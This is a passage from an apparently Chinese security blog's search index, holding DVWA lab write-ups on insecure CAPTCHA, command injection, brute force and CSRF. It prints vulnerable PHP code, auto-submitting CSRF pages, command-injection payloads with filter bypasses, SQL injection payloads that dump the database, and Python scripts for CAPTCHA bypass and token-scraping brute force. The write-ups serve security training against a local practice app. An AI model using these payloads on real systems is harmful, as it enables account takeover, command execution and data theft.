action=&quot;http://127.0.0.1/dvwa/vulnerabilities/captcha/&quot;&gt; &lt;input type=&apos;hidden&apos; name=&apos;step&apos; value=&apos;2&apos;&gt; &lt;input type=&apos;hidden&apos; name=&apos;password_new&apos; value=&apos;password&apos;&gt; &lt;input type=&apos;hidden&apos; name=&apos;password_conf&apos; value=&apos;password&apos;&gt; &lt;input type=&apos;hidden&apos; name=&apos;Change&apos; value=&apos;Change&apos;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 受害者访问攻击页面，最终跳转到修改密码成功的页面，缺点就是会被受害者察觉到密码被修改了 Medium代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;?php if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '1' ) ) &#123; // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ 'password_new' ]; $pass_conf = $_POST[ 'password_conf' ]; // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ], $_SERVER[ 'REMOTE_ADDR' ], $_POST[ 'recaptcha_challenge_field' ], $_POST[ 'recaptcha_response_field' ] ); // Did the CAPTCHA fail? if( !$resp-&gt;is_valid ) &#123; // What happens when the CAPTCHA was entered incorrectly $html .= \"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;\"; $hide_form = false; return; &#125; else &#123; // CAPTCHA was correct. Do both new passwords match? if( $pass_new == $pass_conf ) &#123; // Show next stage for the user echo \" &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\\\"#\\\" method=\\\"POST\\\"&gt; &lt;input type=\\\"hidden\\\" name=\\\"step\\\" value=\\\"2\\\" /&gt; &lt;input type=\\\"hidden\\\" name=\\\"password_new\\\" value=\\\"&#123;$pass_new&#125;\\\" /&gt; &lt;input type=\\\"hidden\\\" name=\\\"password_conf\\\" value=\\\"&#123;$pass_conf&#125;\\\" /&gt; &lt;input type=\\\"hidden\\\" name=\\\"passed_captcha\\\" value=\\\"true\\\" /&gt; &lt;input type=\\\"submit\\\" name=\\\"Change\\\" value=\\\"Change\\\" /&gt; &lt;/form&gt;\"; &#125; else &#123; // Both new passwords do not match. $html .= \"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;\"; $hide_form = false; &#125; &#125; &#125; if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '2' ) ) &#123; // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ 'password_new' ]; $pass_conf = $_POST[ 'password_conf' ]; // Check to see if they did stage 1 if( !$_POST[ 'passed_captcha' ] ) &#123; $html .= \"&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;\"; $hide_form = false; return; &#125; // Check to see if both password match if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update database $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\"; $result = mysql_query( $insert ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); // Feedback for the end user echo \"&lt;pre&gt;Password Changed.&lt;/pre&gt;\"; &#125; else &#123; // Issue with the passwords matching echo \"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;\"; $hide_form = false; &#125; mysql_close(); &#125; ?&gt; 相较于上一关，这里多了一个对passed_captcha参数的验证，这个参数是通过用户输入正确的验证码后自动提交的一个参数，当然我们也可以利用burp自己构造 老规矩先抓包 修改step参数，并且增加passed_captcha参数 修改密码成功 同样的我们依然可以伪造CSRF攻击页面，代码如下： 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;attack-medium&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form id=&apos;transfer&apos; method=&apos;post&apos; action=&apos;http://127.0.0.1/dvwa/vulnerabilities/captcha/&apos;&gt; &lt;input type=&apos;hidden&apos; name=&apos;password_new&apos; value=&apos;password&apos;&gt; &lt;input type=&apos;hidden&apos; name=&apos;password_conf&apos; value=&apos;password&apos;&gt; &lt;input type=&apos;hidden&apos; name=&apos;passed_captcha&apos; value=&apos;true&apos;&gt; &lt;input type=&apos;hidden&apos; name=&apos;step&apos; value=&apos;2&apos;&gt; &lt;input type=&apos;hidden&apos; name=&apos;Change&apos; value=&apos;Change&apos;&gt;&lt;/form&gt;&lt;script type=&quot;text/javascript&quot;&gt; var test=document.getElementById(&apos;transfer&apos;); test.submit();&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; High代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phpif( isset( $_POST[ &apos;Change&apos; ] ) ) &#123; // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos; ], $_POST[&apos;g-recaptcha-response&apos;] ); if ( $resp || ( $_POST[ &apos;g-recaptcha-response&apos; ] == &apos;hidd3n_valu3&apos; &amp;&amp; $_SERVER[ &apos;HTTP_USER_AGENT&apos; ] == &apos;reCAPTCHA&apos; ) )&#123; // CAPTCHA was correct. Do both new passwords match? if ($pass_new == $pass_conf) &#123; $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update database $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // Feedback for user $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Ops. Password mismatch $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; &#125; &#125; else &#123; // What happens when the CAPTCHA was entered incorrectly $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 这关没有了对step参数的检测，关键检测点在于语句： 1234567if ( $resp || ( $_POST[ &apos;g-recaptcha-response&apos; ] == &apos;hidd3n_valu3&apos; &amp;&amp; $_SERVER[ &apos;HTTP_USER_AGENT&apos; ] == &apos;reCAPTCHA&apos; )) 如果这个if语句执行不了，那么就验证失败，无法修改密码，所以我们必须让这个if语句执行，也就是里面的逻辑语句为真，而里面的逻辑语句是由两个逻辑语句通过 || 拼接成的，所以我们只需要让其中一个逻辑语句为真，条件就可以成立，再看里面检测的参数，$resp参数明显是我们不可控的，所以我们只要将重点放在参数g-recaptcha-response和参数HTTP_USER_AGENT上面就行了，要让if语句执行，就控制参数g-recaptcha-response值为hidd3n_valu3，请求头的user_agent为reCAPTCHA 依然是抓包 然后修改参数g-recaptcha-response和参数HTTP_USER_AGENT 修改成功 由于无法用javascript代码修改user_agent参数，所以无法用CSRF原理攻击 最后附上本关修改密码的python脚本 123456789101112131415161718192021222324252627import requestsurl=\"http://127.0.0.1/dvwa/vulnerabilities/captcha/\"header=&#123; 'Host': '127.0.0.1', 'Content-Length': '103', 'Cache-Control': 'max-age=0', 'Origin': 'http://127.0.0.1', 'Upgrade-Insecure-Requests': '1', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'reCAPTCHA', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Referer': 'http://127.0.0.1/dvwa/vulnerabilities/captcha/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Cookie': 'security=high; PHPSESSID=842n4cnel00gbrkd5mi9fk98f6', 'Connection': 'close' &#125;data=&#123; 'password_new':'password', 'password_conf':'password', 'g-recaptcha-response':'hidd3n_valu3', 'Change':'Change' &#125;r=requests.post(url,headers=header,data=data)if('Password Changed.') in r.text: print('Password Changed.') Impossible代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;?phpif( isset( $_POST[ &apos;Change&apos; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_new = stripslashes( $pass_new ); $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); $pass_conf = $_POST[ &apos;password_conf&apos; ]; $pass_conf = stripslashes( $pass_conf ); $pass_conf = mysql_real_escape_string( $pass_conf ); $pass_conf = md5( $pass_conf ); $pass_curr = $_POST[ &apos;password_current&apos; ]; $pass_curr = stripslashes( $pass_curr ); $pass_curr = mysql_real_escape_string( $pass_curr ); $pass_curr = md5( $pass_curr ); // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos; ], $_SERVER[ &apos;REMOTE_ADDR&apos; ], $_POST[ &apos;recaptcha_challenge_field&apos; ], $_POST[ &apos;recaptcha_response_field&apos; ] ); // Did the CAPTCHA fail? if( !$resp-&gt;is_valid ) &#123; // What happens when the CAPTCHA was entered incorrectly echo &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; &#125; else &#123; // Check that the current password is correct $data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR ); $data-&gt;execute(); // Do both new password match and was the current password correct? if( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123; // Update the database $data = $db-&gt;prepare( &apos;UPDATE users SET password = (:password) WHERE user = (:user);&apos; ); $data-&gt;bindParam( &apos;:password&apos;, $pass_new, PDO::PARAM_STR ); $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;execute(); // Feedback for the end user - success! echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Feedback for the end user - failed! echo &quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;; $hide_form = false; &#125; &#125; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 可以看出服务器采用了token认证机制，还采用了PDO防止SQL注入，更主要的是对于校验验证码的过程只检测了我们不可控的参数$resp-&gt;is_valid，可谓是非常完美的防御了各种漏洞。用户还必须输入当前的密码，更加完善了安全性","categories":[{"name":"dvwa-Insecure CAPTCHA","slug":"dvwa-Insecure-CAPTCHA","permalink":"https://Foxgrin.github.io/categories/dvwa-Insecure-CAPTCHA/"}],"tags":[{"name":"Insecure CAPTCHA","slug":"Insecure-CAPTCHA","permalink":"https://Foxgrin.github.io/tags/Insecure-CAPTCHA/"}]},{"title":"dvwa-Command Injection","slug":"dvwa-Command Injection","date":"2018-07-15T06:18:00.000Z","updated":"2018-07-15T09:55:42.115Z","comments":true,"path":"/posts/63531/","link":"","permalink":"https://Foxgrin.github.io/posts/63531/","excerpt":"总结了dvwa中命令注入漏洞的关卡","text":"总结了dvwa中命令注入漏洞的关卡 Low代码复现如下： 1234567891011121314&lt;?phpif(isset($_POST[&apos;Submit&apos;]))&#123; $target=$_REQUEST[&apos;ip&apos;]; if(stristr(php_uname(&apos;s&apos;),&apos;Windows NT&apos;))&#123; $cmd=shell_exec(&apos;ping &apos;.$target); &#125; else&#123; $cmd=shell_exec(&apos;ping -c 4 &apos;.$target); &#125; echo &quot;&lt;pre&gt;$cmd&lt;/pre&gt;&quot;;&#125;?&gt; 了解这里的漏洞之前，我们还是先来了解一下一些函数的使用： (1)stristr(string,search,before_search)：搜索一个字符串在另一个字符串中首次出现的位置的剩余部分，搜索失败返回false,其中参数string表示被搜索的字符串，search表示要搜索的字符串，before_search是可选参数，默认为false，如果设置为true则返回搜索字符串在被搜索字符串首次出现的位置的前面部分 例子如下: 1&lt;?php echo stristr(&apos;I love php&apos;,&apos;love&apos;); ?&gt; 搜索love在原字符串中首次出现位置的剩余部分，结果返回love php，验证结果如下： (2)php_uname(mode)：返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。 例子如下： 1&lt;?php echo stristr(php_uname('s'),'Windows NT'); ?&gt; 运行结果如下： 可见源代码中对操作系统的名称进行了检测 (3)shell_exec(cmd)：在外部执行一个命令，参数cmd即为要执行的命令 例子如下： 1234&lt;?php$cmd=shell_exec('ping 127.0.0.1');echo \"&lt;pre&gt;$cmd&lt;/pre&gt;\";?&gt; 执行结果如下： 了解完这三个函数，我们就能大概了解这关是执行一个在浏览器上的ping命令程序，服务器会对操作系统的名称进行检测，如果不是Windows NT系统则执行linux系统的Ping命令。但是，由于服务器未对ip参数进行任何的过滤，因此存在严重的Command Injection(命令注入)漏洞 漏洞利用我们可以通过该漏洞执行我们想要执行的命令，但要保证前面ping命令格式的正确，再通过命令连接符跟上我们想要执行的命令在windows下 &amp;&amp;,&amp;,|,|| 都可以当做命令连接符，四者区别如下： 命令1 &amp;&amp; 命令2 ：先执行命令1，若命令1执行成功再执行命令2，若命令1执行不成功则不执行命令2 命令1 &amp; 命令2 ：先执行命令1，不管命令1执行成不成功都继续执行命令2 命令1 | 命令2 ：只执行命令2，前提是命令1必须执行成功 命令1 || 命令2 ：先执行命令1，若命令1执行成功则不执行命令2，若命令1执行不成功则执行命令2 然后我们就可以执行想要执行的命令了 例如要获取用户信息 输入127.0.0.1 &amp;&amp; net user 获取ip地址信息 输入127.0.0.1 &amp;&amp; ipconfig 获取arp表信息 输入127.0.0.1 &amp;&amp; arp -a 还可以利用type命令查看一些配置文件内容，前提是已经文件绝对路径 例如查看mysql配置信息 输入127.0.0.1 | type C:\\phpStudy\\PHPTutorial\\MySQL\\my.ini 可见，该漏洞的危害是很大的，攻击者可以执行任意想执行的命令 Medium代码复现如下： 12345678910111213141516171819&lt;?phpif(isset($_POST[&apos;Submit&apos;]))&#123; $target=$_REQUEST[&apos;ip&apos;]; $substitutions=array( &apos;&amp;&amp;&apos;=&gt;&apos;&apos;, &apos;;&apos;=&gt;&apos;&apos; ); $target=str_replace(array_keys($substitutions),$substitutions,$target); if(stristr(php_uname(&apos;s&apos;),&apos;Windows NT&apos;))&#123; $cmd=shell_exec(&apos;ping &apos;.$target); &#125; else&#123; $cmd=shell_exec(&apos;ping -c 4 &apos;.$target); &#125; echo &quot;&lt;pre&gt;$cmd&lt;/pre&gt;&quot;;&#125;?&gt; 这里我们还是先来了解几个函数： (1)array_keys(array,value,strict)：返回包含数组中所有键名的新数组，参数array为所选数组，value为指定键值，若输入则返回键值对应的键名，strict指定依赖类型 例子如下： 1234567&lt;?php$substitutions=array( '&amp;&amp;'=&gt;'', ';'=&gt;'');print_r(array_keys($substitutions));?&gt; 运行结果如下： (2)str_replace(find,replace,string,count)：以其他字符替换所选字符串中的指定字符，参数find为查找的字符，replace为替换的字符，string为所选的字符串，count为计算替换数的变量 了解了这两个函数，我们就可以这关对’&amp;&amp;’和’;’这两个字符进行了过滤，但是str_replace函数是非常不安全的，因为它只进行了一次的替换，最普遍的绕过方法就是双写绕过，但是这里&amp;&amp;由于都是同样的字符无法双写，但是服务器还对’;’字符进行了过滤，所以我们可以输入 127.0.0.1 &amp;;&amp; net user，由于只过滤了一次，过滤字符’;’后就剩下了&amp;&amp;，结果如下： 虽然&amp;&amp;被过滤了，但是命令连接符还有&amp;和|可以使用，注意三者的区别即可 输入127.0.0.1 | net user High代码复现如下： 123456789101112131415161718192021222324252627&lt;?phpif(isset($_POST[&apos;Submit&apos;]))&#123; $target=trim($_REQUEST[&apos;ip&apos;]); $substitutions = array( &apos;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, &apos;| &apos; =&gt; &apos;&apos;, &apos;-&apos; =&gt; &apos;&apos;, &apos;$&apos; =&gt; &apos;&apos;, &apos;(&apos; =&gt; &apos;&apos;, &apos;)&apos; =&gt; &apos;&apos;, &apos;`&apos; =&gt; &apos;&apos;, &apos;||&apos; =&gt; &apos;&apos;, ); $target=str_replace(array_keys($substitutions),$substitutions,$target); if(stristr(php_uname(&apos;s&apos;),&apos;Windows NT&apos;))&#123; $cmd=shell_exec(&apos;ping &apos;.$target); &#125; else&#123; $cmd=shell_exec(&apos;ping -c 4 &apos;.$target); &#125; echo &quot;&lt;pre&gt;$cmd&lt;/pre&gt;&quot;;&#125;?&gt; 这关过滤的字符较为完全，其中过滤了字符’&amp;’，也就是说连接符&amp;&amp;和&amp;都不能使用了，还过滤了字符’|’和’||’，但仔细看是过滤了’| ‘而不是’|’，(|后面还有一个空格)，也就是说连接符|还可以使用 输入127.0.0.1|net user 还可以在||中间加一个被过滤的字符，例如； 但是必须保证ping 命令执行失败才执行||之后的命令 输入11 |;| net user 成功绕过过滤 Impossible代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $target = $_REQUEST[ &apos;ip&apos; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123; // If all 4 octets are int&apos;s put the IP back together. $target = $octet[0] . &apos;.&apos; . $octet[1] . &apos;.&apos; . $octet[2] . &apos;.&apos; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) &#123; // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; &#125; else &#123; // Ops. Let the user name theres a mistake echo &apos;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&apos;; &#125; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 首先还是先了解几个函数： (1)explode(separator,string,limit)：将字符串打散成数组，返回组成的数组，参数separator为分隔符，规定在哪里开始分割字符串，string为要分割的字符串，limit规定所返回的数组元素的数目 (2)is_numeric(string)：检测string是否为数字或数字字符串，是则返回true，不是则返回false (3)sizeof(array,mode)：计算数组中的元素个数 这里首先采用了token令牌机制，用户每次提交表单时都附带提交一个token值，服务器将提交的token值与session或cookie中存储的token值进行比较，相同则通过请求，不同则过滤请求 然后将输入的ip值以字符’.’为分隔符打散成一个数组，并检测数组中的每个元素是否为数字并且数组元素个数是否为4，这就限制了我们输入的值必须是一个正确格式的ip地址 也就是说只有“数字.数字.数字.数字”的输入才会被执行，非常完美的防止了命令注入漏洞","categories":[{"name":"dvwa-Command Injection","slug":"dvwa-Command-Injection","permalink":"https://Foxgrin.github.io/categories/dvwa-Command-Injection/"}],"tags":[{"name":"Command Injection","slug":"Command-Injection","permalink":"https://Foxgrin.github.io/tags/Command-Injection/"}]},{"title":"dvwa-Brute Force","slug":"dvwa-Brute Force","date":"2018-07-14T07:50:00.000Z","updated":"2018-07-14T13:50:44.048Z","comments":true,"path":"/posts/22283/","link":"","permalink":"https://Foxgrin.github.io/posts/22283/","excerpt":"总结了dvwa中暴力破解的一些关卡","text":"总结了dvwa中暴力破解的一些关卡 Low代码复现如下： 12345678910111213141516171819202122&lt;?phpinclude(&quot;../sql-connection.php&quot;);if(isset($_GET[&apos;Login&apos;]))&#123; $user=$_GET[&apos;username&apos;]; $pass=$_GET[&apos;password&apos;]; $pass=md5($pass); $sql=&quot;SELECT * FROM users WHERE user=&apos;$user&apos; AND password=&apos;$pass&apos;&quot;; $result=mysql_query($sql) or die(mysql_error()); if($result &amp;&amp; mysql_num_rows($result) == 1)&#123; $avatar=mysql_result($result,0,&apos;avatar&apos;); echo &quot;&lt;p&gt;Welcome to the password protected area $user&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else&#123; echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125;&#125;?&gt; 这里的关卡是一个用户登录的界面，用户必须正确输入用户名和密码才能成功登录，我们从源代码来看，服务器只对是否GET了一个Login值进行了检测，存在了明显的sql注入漏洞，攻击者不仅可以通过sql注入获取用户信息，还可以利用暴力破解的方法获取用户密码，这就是Brute Force(暴力破解) 漏洞利用(1)利用burpsuite爆破密码 首先抓包 因为我们要对password参数进行爆破，所以在password参数的内容两边加上$ 然后将包发送到intruder模块，选中Payloads，载入字典，点击爆破 从爆破结果的响应包长度来看，只有值为password的响应包长度与众不同，猜测正确密码就是password，尝试登陆，成功 (2)sql注入 首先寻找注入点，这里因为$pass经过md5加密，所以不能当做注入点，注入点就只剩下了$user 我们可以使用万能密码登录，在username中输入admin’ or ‘1’=’1 登录成功 也可以输入admin’# 同样登录成功 如果要获取admin的密码信息，我们可以继续注入 因为服务器限制了查询结果返回的行数只能为1，所以要获取信息，我们必须能让$user值在数据库中不存在 任意输入username值为 0‘# 测试不存在该用户名 因为这里有返回信息，我们可以考虑用较为简单的联合查询注入 那么首先我们就必须知道查询的列数，输入admin’ order by 9#发现报错 所以查询列数为8 接下来就是找获取有效信息的位置，我们输入0’ union select 1,2,3,4,5,6,7,8# 从页面上看是获取不到我们需要的信息，因为图片加载不出来，但是我们可以从源代码看 有效信息在6所处的位置，因此我们在6的位置开始注入 首先爆库 输入0’ union select 1,2,3,4,5,database(),7,8# 接着爆表 输入0’ union select 1,2,3,4,5,(select group_concat(table_name) from information_schema.tables where table_schema=database()),7,8# 再来爆列 输入0’ union select 1,2,3,4,5,(select group_concat(column_name) from information_schema.columns where table_name=’users’),7,8# 最后爆数据 输入0’ union select 1,2,3,4,5,(select password from users where user=’admin’),7,8# 但是这里获取到的密码经过md5加密，md5又属于单向加密技术，所以这个密码并没有实际的用处 Medium代码复现如下： 12345678910111213141516171819202122232425&lt;?phpinclude(&quot;../sql-connection.php&quot;);if(isset($_GET[&apos;Login&apos;]))&#123; $user=$_GET[&apos;username&apos;]; $user=mysql_real_escape_string($user); $pass=$_GET[&apos;password&apos;]; $pass=mysql_real_escape_string($pass); $pass=md5($pass); $sql=&quot;SELECT * FROM users WHERE user=&apos;$user&apos; AND password=&apos;$pass&apos;&quot;; $result=mysql_query($sql) or die(mysql_error()); if($result &amp;&amp; mysql_num_rows($result) == 1)&#123; $avatar=mysql_result($result,0,&apos;avatar&apos;); echo &quot;&lt;p&gt;Welcome to the password protected area $user&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else&#123; sleep(2); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125;&#125;?&gt; 相对于上一关，这关对$user和$pass进行了mysql_real_escape的转义处理，预防了sql注入 并且登录失败时会sleep 2秒 虽然预防了sql注入，但是依然可以利用burp爆破密码，跟上一关一样就不演示了 High代码复现如下： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpif(isset($_GET[&apos;Login&apos;]))&#123;//CheckAnti-CSRFtokencheckToken($_REQUEST[&apos;user_token&apos;],$_SESSION[&apos;session_token&apos;],&apos;index.php&apos;);//Sanitiseusernameinput$user=$_GET[&apos;username&apos;];$user=stripslashes($user);$user=mysql_real_escape_string($user);//Sanitisepasswordinput$pass=$_GET[&apos;password&apos;];$pass=stripslashes($pass);$pass=mysql_real_escape_string($pass);$pass=md5($pass);//Checkdatabase$query=&quot;SELECT*FROM`users`WHEREuser=&apos;$user&apos;ANDpassword=&apos;$pass&apos;;&quot;;$result=mysql_query($query)or die(&apos;&lt;pre&gt;&apos;.mysql_error().&apos;&lt;/pre&gt;&apos;);if($result&amp;&amp;mysql_num_rows($result)==1)&#123;//Getusersdetails$avatar=mysql_result($result,0,&quot;avatar&quot;);//Loginsuccessfulecho&quot;&lt;p&gt;Welcometothepasswordprotectedarea&#123;$user&#125;&lt;/p&gt;&quot;;echo&quot;&lt;imgsrc=&quot;&#123;$avatar&#125;&quot;/&gt;&quot;;&#125;else&#123;//Loginfailedsleep(rand(0,3));echo&quot;&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;/pre&gt;&quot;;&#125;mysql_close();&#125;//GenerateAnti-CSRFtokengenerateSessionToken();?&gt; 加入了token验证机制，我们每次登录时都必须提交一个token值，服务器将提交的token值与cookie或session中的token值对比，若不同则拦截下来，也就是说用之前burp爆破密码的方法是行不通的 还利用了mysql_real_escape_string函数对$user和$pass进行了转义处理，防止了sql注入 这里我们要想登录，就必须获取到token值，这关利用python脚本进行爆破 代码如下： 12345678910111213141516171819202122232425262728293031import requestsfrom bs4 import BeautifulSoupurl=\"http://127.0.0.1/dvwa/vulnerabilities/brute/\"header=&#123; 'Host': '127.0.0.1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Referer': 'http://127.0.0.1/dvwa/vulnerabilities/brute/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Cookie': 'security=high; PHPSESSID=842n4cnel00gbrkd5mi9fk98f6', 'Connection': 'close' &#125;file=open('pass.txt','r')for line in file: line=line.strip() s=requests.Session() r=s.get(url,headers=header) soup=BeautifulSoup(r.text,'html.parser') user_token=soup.find_all('input')[3]['value'] payload=&#123; 'username':'admin', 'password':line, 'user_token':user_token, 'Login':'Login' &#125; html=s.get(url,params=payload,headers=header) length=len(html.text) print('user_token:'+user_token+'username:admin password:'+line+' length:'+str(length)) 思路是首先读取文件中一个个猜测的密码，这里只用10个密码进行模拟，然后创建一个会话记录，用于保政访问页面的token值不发生变化，然后利用BeautifulSoup库的find_all方法获取所有input标签组成的列表，带有token值的input标签在列表的第三个元素，然后将value属性的值，也就是token值取出，这就获得了token值，然后再将各个参数通过get形式传递给服务器，最终比较返回页面的长度，正常而言，输入正确和失败返回的页面长度是不同的，所以众多猜测密码中，只有一个密码返回的页面长度是不同的，那个密码就可能是正确的密码 这里还应当注意，应先用burp抓包获取访问登录页面的请求头，否则脚本每次访问的都是dvwa一开始的登录页面 脚本执行结果： 可以看出password的返回长度跟其他不同，在登录页面输入，登录成功","categories":[{"name":"dvwa-Brute Force","slug":"dvwa-Brute-Force","permalink":"https://Foxgrin.github.io/categories/dvwa-Brute-Force/"}],"tags":[{"name":"Brute Force","slug":"Brute-Force","permalink":"https://Foxgrin.github.io/tags/Brute-Force/"}]},{"title":"dvwa-CSRF","slug":"dvwa-CSRF","date":"2018-07-13T06:26:00.000Z","updated":"2018-07-13T16:32:30.852Z","comments":true,"path":"/posts/48103/","link":"","permalink":"https://Foxgrin.github.io/posts/48103/","excerpt":"总结了dvwa中关于跨网站请求伪造的一些关卡","text":"总结了dvwa中关于跨网站请求伪造的一些关卡 Low代码复现如下： 123456789101112131415161718192021&lt;?phpinclude(\"../sql-connection.php\");$pass_new=$_GET['password_new'];$pass_conf=$_GET['password_conf'];if($_GET['password_new'] == $_GET['password_conf'])&#123; $pass_new=mysql_real_escape_string($pass_new); $pass_new=md5($pass_new); $username=$_COOKIE['Username']; $sql=\"UPDATE users SET password='$pass_new' WHERE user='$username'\"; $result=mysql_query($sql) or die(mysql_error()); echo \"Your password has changed\";&#125;else &#123; echo \"Password didn't match\";&#125;?&gt; 